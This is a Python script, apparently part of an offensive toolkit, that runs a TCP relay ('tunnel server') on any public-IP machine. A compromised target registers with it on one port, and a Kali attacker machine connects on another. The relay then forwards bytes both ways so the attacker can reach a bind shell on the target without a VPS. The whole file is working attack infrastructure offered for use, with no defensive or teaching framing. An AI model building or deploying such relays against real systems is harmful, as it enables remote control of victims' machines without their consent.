"""
Tunnel Server — TCP relay for bind shell (no VPS needed)
Runs on ANY machine with a public IP (friend's PC, free cloud VM, etc.)

Usage:
  python tunnel_server.py [<pub_port> <reg_port>]
    pub_port = port for Kali to connect (default 4444)
    reg_port = port for target to register (default 5555)

Architecture:
  Kali → tunnel_server:pub_port ←→ tunnel_server:reg_port → target → bind shell

Requirements: Python 3 (no extra packages)
"""
import socket, threading, sys, time

PUB_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
REG_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5555

def bridge(kali, target, name):
    """Bidirectional byte forwarding"""
    def forward(src, dst, direction):
        try:
            while True:
                d = src.recv(4096)
                if not d: break
                dst.sendall(d)
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            print(f"[!] {name} {direction} closed ({type(e).__name__})")
        except Exception as e:
            print(f"[!] {name} {direction} error: {e!r}")
        finally:
            try: src.close()
            except Exception: pass
            try: dst.close()
            except Exception: pass

    t1 = threading.Thread(target=forward, args=(kali, target, "K→T"), daemon=True)
    t2 = threading.Thread(target=forward, args=(target, kali, "T→K"), daemon=True)
    t1.start(); t2.start()
    t1.join(); t2.join()

def main():
    reg_sock = socket.socket()
    reg_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    reg_sock.bind(('0.0.0.0', REG_PORT))
    reg_sock.listen(5)
    print(f"[*] Target register port: {REG_PORT}")
    print(f"[*] Kali connect port:    {PUB_PORT}")
    print("[*] Waiting for target to register...")

    # Wait for target to connect
    target, taddr = reg_sock.accept()
    print(f"[+] Target connected: {taddr}")
    target.sendall(b"READY\n")  # Tell target we're ready

    # Now set up public listener for Kali
    pub_sock = socket.socket()
    pub_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    pub_sock.bind(('0.0.0.0', PUB_PORT))
    pub_sock.listen(5)
    print(f"[*] Waiting for Kali on port {PUB_PORT}...")

    kali, kaddr = pub_sock.accept()
    print(f"[+] Kali connected: {kaddr}")

    # Bridge
    target.sendall(b"GO\n")
    print("[+] Tunnel established! Forwarding...")
    bridge(kali, target, f"{taddr}↔{kaddr}")

    target.close(); kali.close()
    pub_sock.close(); reg_sock.close()

if __name__ == "__main__":
    main()
